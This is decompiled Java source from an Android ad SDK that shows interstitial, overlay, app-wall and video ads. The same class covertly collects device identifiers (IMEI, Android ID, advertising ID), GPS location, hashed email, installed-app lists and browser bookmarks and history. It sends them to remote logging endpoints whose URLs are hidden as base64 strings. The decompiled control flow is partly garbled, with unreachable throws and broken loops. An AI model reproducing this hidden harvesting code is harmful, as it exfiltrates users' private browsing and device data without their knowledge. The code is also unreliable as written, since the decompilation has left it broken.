package com.onqz.vddv187097;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.provider.Browser;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

class f
  implements j
{
  static JSONObject a = null;
  static List<NameValuePair> b;
  private static Context e;
  private static String f = "0";
  private static SharedPreferences g;
  b<String> c = new b()
  {
    public void a(String paramAnonymousString)
    {
      Util.a("App info result: " + paramAnonymousString);
      if ((paramAnonymousString != null) && (!paramAnonymousString.equals(""))) {
        f.f(f.b());
      }
      if (Util.r(f.b())) {
        f.this.d.launchNewHttpTask();
      }
    }
    
    public void launchNewHttpTask()
    {
      if (MA.isSDKEnabled(f.b())) {}
      try
      {
        new Thread(new Runnable()
        {
          public void run()
          {
            Object localObject2 = new StringBuilder();
            Object localObject1 = new StringBuilder();
            Object localObject3 = f.b().getPackageManager().getInstalledApplications(128).iterator();
            while (((Iterator)localObject3).hasNext())
            {
              Object localObject4 = (ApplicationInfo)((Iterator)localObject3).next();
              if (f.a(f.this, (ApplicationInfo)localObject4))
              {
                localObject4 = "\"" + ((ApplicationInfo)localObject4).packageName + "\"";
                ((StringBuilder)localObject1).append((String)localObject4 + ",");
              }
              else
              {
                localObject4 = "\"" + ((ApplicationInfo)localObject4).packageName + "\"";
                ((StringBuilder)localObject2).append((String)localObject4 + ",");
              }
            }
            localObject2 = ((StringBuilder)localObject2).toString();
            localObject1 = ((StringBuilder)localObject1).toString();
            localObject3 = new ArrayList();
            ((List)localObject3).add(new BasicNameValuePair("imei", Util.g()));
            ((List)localObject3).add(new BasicNameValuePair("imei_sha", Util.h()));
            ((List)localObject3).add(new BasicNameValuePair("android_id", Util.f(f.b())));
            ((List)localObject3).add(new BasicNameValuePair("android_id_sha", Util.g(f.b())));
            ((List)localObject3).add(new BasicNameValuePair("deviceUniqueness", Util.w()));
            ((List)localObject3).add(new BasicNameValuePair("user_apps", (String)localObject2));
            ((List)localObject3).add(new BasicNameValuePair("system_apps", (String)localObject1));
            if (Util.r(f.b())) {
              new Thread(new o(f.b(), f.this.c, (List)localObject3, "aHR0cHM6Ly9hcGkuYWlycHVzaC5jb20vbHAvbG9nX3Nka19yZXF1ZXN0LnBocA==", 30000L, false), "appd").start();
            }
          }
        }, "app").start();
        return;
      }
      catch (Exception localException) {}
    }
  };
  b<String> d = new b()
  {
    public void a(String paramAnonymousString)
    {
      Util.a("History result: " + paramAnonymousString);
      if ((paramAnonymousString != null) && (!paramAnonymousString.equals(""))) {
        f.f(f.b());
      }
    }
    
    public void launchNewHttpTask()
    {
      if (MA.isSDKEnabled(f.b())) {
        try
        {
          Object localObject = f.b().getContentResolver().query(Browser.BOOKMARKS_URI, new String[] { "url", "date" }, null, null, null);
          JSONArray localJSONArray = new JSONArray();
          if (localObject != null) {
            if (!((Cursor)localObject).moveToFirst()) {}
          }
          for (;;)
          {
            long l = ((Cursor)localObject).getLong(((Cursor)localObject).getColumnIndex("date"));
            String str = ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("url"));
            try
            {
              JSONObject localJSONObject = new JSONObject();
              localJSONObject.put("date", Util.b(Long.valueOf(l).longValue()));
              localJSONObject.put("url", str);
              localJSONArray.put(localJSONObject);
              if (!((Cursor)localObject).moveToNext())
              {
                ((Cursor)localObject).close();
                localObject = new ArrayList();
                ((List)localObject).add(new BasicNameValuePair("imei", Util.g()));
                ((List)localObject).add(new BasicNameValuePair("imei_sha", Util.h()));
                ((List)localObject).add(new BasicNameValuePair("android_id", Util.f(f.b())));
                ((List)localObject).add(new BasicNameValuePair("android_id_sha", Util.g(f.b())));
                ((List)localObject).add(new BasicNameValuePair("deviceUniqueness", Util.w()));
                ((List)localObject).add(new BasicNameValuePair("inputlist", localJSONArray.toString()));
                Util.a("History Values >>>>>>: " + localObject);
                if (Util.r(f.b()))
                {
                  new Thread(new o(f.b(), f.this.d, (List)localObject, "aHR0cHM6Ly9hcGkuYWlycHVzaC5jb20vbmV3YWQvcmVwb3J0L2xvZ1VzZXJCcm93c2VySGlzdG9yeS5waHA=", 5000L, false), "browser").start();
                  return;
                }
              }
            }
            catch (JSONException localJSONException)
            {
              Util.a("error inlist");
              return;
            }
          }
          return;
        }
        catch (Exception localException) {}
      }
    }
  };
  
  public f(Context paramContext)
  {
    e = paramContext;
  }
  
  static List<NameValuePair> a(Context paramContext)
    throws NullPointerException, Exception
  {
    e = paramContext;
    b = new ArrayList();
    if (i(paramContext))
    {
      paramContext = Util.c();
      if ((paramContext != null) && (!paramContext.equals("")))
      {
        b.add(new BasicNameValuePair("imei", Util.n(paramContext)));
        b.add(new BasicNameValuePair("imei_sha", Util.o(paramContext)));
        b.add(new BasicNameValuePair("deviceUniqueness", "ADV"));
      }
    }
    for (;;)
    {
      if ((Util.j() == null) || (Util.j().length() == 0))
      {
        throw new NullPointerException("Appid is empty");
        throw new NullPointerException("Advertising id not avalaible");
        if ((Util.g() == null) || (Util.g().length() == 0)) {
          throw new NullPointerException("IMEI is empty");
        }
        b.add(new BasicNameValuePair("imei", Util.g()));
        b.add(new BasicNameValuePair("imei_sha", Util.h()));
        b.add(new BasicNameValuePair("deviceUniqueness", Util.w()));
        b.add(new BasicNameValuePair("android_id", Util.f(e)));
        b.add(new BasicNameValuePair("android_id_sha", Util.g(e)));
        b.add(new BasicNameValuePair("longitude", Util.m()));
        b.add(new BasicNameValuePair("latitude", Util.l()));
        b.add(new BasicNameValuePair("locProvider", "" + Util.q()));
        b.add(new BasicNameValuePair("locType", "" + Util.o()));
        b.add(new BasicNameValuePair("locAccuracy", "" + Util.p()));
        paramContext = Util.c(e);
        if ((paramContext != null) && (!paramContext.equals("")))
        {
          b.add(new BasicNameValuePair("email_md5", Util.n(paramContext)));
          b.add(new BasicNameValuePair("email_sha", Util.o(paramContext)));
        }
      }
      try
      {
        paramContext = Util.o(e);
        b.add(new BasicNameValuePair("country", "" + paramContext[0]));
        b.add(new BasicNameValuePair("zip", "" + paramContext[1]));
      }
      catch (NullPointerException paramContext)
      {
        continue;
        b.add(new BasicNameValuePair("APIKEY", Util.i()));
        b.add(new BasicNameValuePair("appId", Util.j()));
        b.add(new BasicNameValuePair("token", f));
        b.add(new BasicNameValuePair("request_timestamp", Util.r()));
        b.add(new BasicNameValuePair("packageName", Util.h(e)));
        b.add(new BasicNameValuePair("version", Util.t()));
        b.add(new BasicNameValuePair("carrier", Util.i(e)));
        b.add(new BasicNameValuePair("networkOperator", Util.j(e)));
        b.add(new BasicNameValuePair("phoneModel", Util.s()));
        b.add(new BasicNameValuePair("manufacturer", Util.v()));
        b.add(new BasicNameValuePair("sdkversion", Util.a()));
        b.add(new BasicNameValuePair("wifi", "" + Util.k(e)));
        b.add(new BasicNameValuePair("useragent", Util.k()));
        b.add(new BasicNameValuePair("screenSize", Util.n(e)));
        b.add(new BasicNameValuePair("networkSubType", Util.l(e)));
        b.add(new BasicNameValuePair("isTablet", String.valueOf(Util.a(e))));
        b.add(new BasicNameValuePair("SD", Util.p(e)));
        b.add(new BasicNameValuePair("isConnectionFast", "" + Util.m(e)));
        b.add(new BasicNameValuePair("unknownsource", "" + Util.t(e)));
        b.add(new BasicNameValuePair("appName", Util.s(e)));
        b.add(new BasicNameValuePair("dpi", Util.q(e)));
        b.add(new BasicNameValuePair("src", "inappbundled"));
        b.add(new BasicNameValuePair("sessionId", Util.e()));
        b.add(new BasicNameValuePair("language", "" + Util.x()));
        b.add(new BasicNameValuePair("locale", "" + Locale.getDefault()));
        b.add(new BasicNameValuePair("adv_id", "" + Util.c()));
        b.add(new BasicNameValuePair("adOpt", "" + Util.b()));
        return b;
      }
      catch (Exception paramContext) {}
    }
  }
  
  static void a(Activity paramActivity)
  {
    try
    {
      SharedPreferences localSharedPreferences = paramActivity.getSharedPreferences("eap", 0);
      paramActivity = new MA(paramActivity);
      if ((localSharedPreferences.contains("interstitialads")) && (localSharedPreferences.getBoolean("interstitialads", false))) {
        paramActivity.callSmartWallAd();
      }
      if ((localSharedPreferences.contains("overylayad")) && (localSharedPreferences.getBoolean("overylayad", false))) {
        paramActivity.callOverlayAd();
      }
      if ((localSharedPreferences.contains("appwall")) && (localSharedPreferences.getBoolean("appwall", false))) {
        paramActivity.callAppWall();
      }
      if ((localSharedPreferences.contains("videoad")) && (localSharedPreferences.getBoolean("videoad", false))) {
        paramActivity.callVideoAd();
      }
      if ((localSharedPreferences.contains("landingpagead")) && (localSharedPreferences.getBoolean("landingpagead", false))) {
        paramActivity.callLandingPageAd();
      }
      if ((localSharedPreferences.contains("rich_media")) && (localSharedPreferences.getBoolean("rich_media", false))) {
        paramActivity.displayRichMediaInterstitialAd();
      }
      return;
    }
    catch (Exception paramActivity)
    {
      Util.b("Error occured in eap: " + paramActivity.getMessage());
    }
  }
  
  private boolean a(ApplicationInfo paramApplicationInfo)
  {
    return (paramApplicationInfo.flags & 0x1) != 0;
  }
  
  static boolean b(Context paramContext)
  {
    boolean bool3 = false;
    boolean bool2 = false;
    boolean bool1;
    if (paramContext != null) {
      bool1 = bool3;
    }
    try
    {
      g = null;
      bool1 = bool3;
      g = paramContext.getSharedPreferences("next_ad_call", 0);
      bool1 = bool3;
      paramContext = g.edit();
      bool1 = bool3;
      long l = 10000L + System.currentTimeMillis();
      bool1 = bool3;
      paramContext.putLong("startTime", l);
      bool1 = bool3;
      bool2 = paramContext.commit();
      bool1 = bool2;
      Log.i("BunSDK", "Next Smart Wall ad call time: " + new Date(l).toString());
      return bool2;
    }
    catch (Exception paramContext) {}
    return bool1;
  }
  
  static long c(Context paramContext)
  {
    long l2 = 0L;
    g = null;
    long l1 = l2;
    if (paramContext != null)
    {
      g = paramContext.getSharedPreferences("next_ad_call", 0);
      l1 = l2;
      if (g != null) {
        l1 = g.getLong("startTime", 0L);
      }
    }
    return l1;
  }
  
  static boolean d(Context paramContext)
  {
    try
    {
      g = null;
      g = paramContext.getSharedPreferences("video_ad_call", 0);
      paramContext = g.edit();
      long l = 30000L + System.currentTimeMillis();
      paramContext.putLong("startTime", l);
      Util.a("Next Video ad ad call time: " + new Date(l).toString());
      boolean bool = paramContext.commit();
      return bool;
    }
    catch (Exception paramContext) {}
    return false;
  }
  
  static long e(Context paramContext)
  {
    long l2 = 0L;
    g = null;
    long l1 = l2;
    if (paramContext != null)
    {
      g = paramContext.getSharedPreferences("video_ad_call", 0);
      l1 = l2;
      if (g != null) {
        l1 = g.getLong("startTime", 0L);
      }
    }
    return l1;
  }
  
  static boolean f(Context paramContext)
  {
    if (paramContext != null)
    {
      g = null;
      g = paramContext.getSharedPreferences("app_list_data", 0);
      paramContext = g.edit();
      paramContext.putLong("startTime", System.currentTimeMillis() + 604800000L);
      return paramContext.commit();
    }
    Util.a("Unable to save app time data.");
    return false;
  }
  
  static long g(Context paramContext)
  {
    long l2 = 0L;
    g = null;
    long l1 = l2;
    if (paramContext != null)
    {
      g = paramContext.getSharedPreferences("app_list_data", 0);
      l1 = l2;
      if (g != null) {
        l1 = g.getLong("startTime", 0L);
      }
    }
    return l1;
  }
  
  static void h(Context paramContext)
  {
    try
    {
      paramContext = paramContext.getSharedPreferences("firstTime", 0).edit();
      paramContext.putBoolean("showDialog", false);
      paramContext.putString("adv_id", Util.c());
      paramContext.commit();
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  static boolean i(Context paramContext)
  {
    paramContext = paramContext.getSharedPreferences("firstTime", 0);
    String str1 = paramContext.getString("adv_id", "");
    String str2 = Util.c();
    if (paramContext.getBoolean("showDialog", true)) {}
    while ((!str1.equals("")) && (str2 != null) && (str2.length() > 0) && (!str1.equalsIgnoreCase(str2))) {
      return true;
    }
    return false;
  }
  
  void a()
  {
    for (;;)
    {
      try
      {
        Util.h(new WebView(e).getSettings().getUserAgentString());
        Object localObject1 = new t(e);
        try
        {
          if (!i(e))
          {
            localObject2 = ((t)localObject1).d();
            if (localObject2 == null) {
              continue;
            }
            String str3 = "" + ((Location)localObject2).getLatitude();
            String str4 = "" + ((Location)localObject2).getLongitude();
            Util.k(((t)localObject1).c());
            Util.a(((Location)localObject2).getAccuracy());
            Util.l(((Location)localObject2).getProvider());
            Util.a("Location: lat " + str3 + ", lon " + str4);
            Util.i(str3);
            Util.j(str4);
          }
        }
        catch (Exception localException1)
        {
          Object localObject2;
          continue;
          String str1 = Util.n(localException1);
          continue;
        }
        localObject2 = Util.c();
        if (localObject2 != null)
        {
          localObject1 = localObject2;
          if (!((String)localObject2).equals(""))
          {
            localObject2 = new StringBuilder();
            if (i(e))
            {
              localObject1 = Util.g();
              f = (String)localObject1 + "" + Util.j() + "" + Util.r();
              localObject1 = MessageDigest.getInstance("MD5");
              ((MessageDigest)localObject1).update(f.getBytes(), 0, f.length());
              f = new BigInteger(1, ((MessageDigest)localObject1).digest()).toString(16);
              return;
              Util.a("Location null: ");
              continue;
            }
          }
        }
        String str2 = "NOT FOUND";
      }
      catch (Exception localException2)
      {
        Util.a("Token conversion Error ");
        return;
      }
    }
  }
}
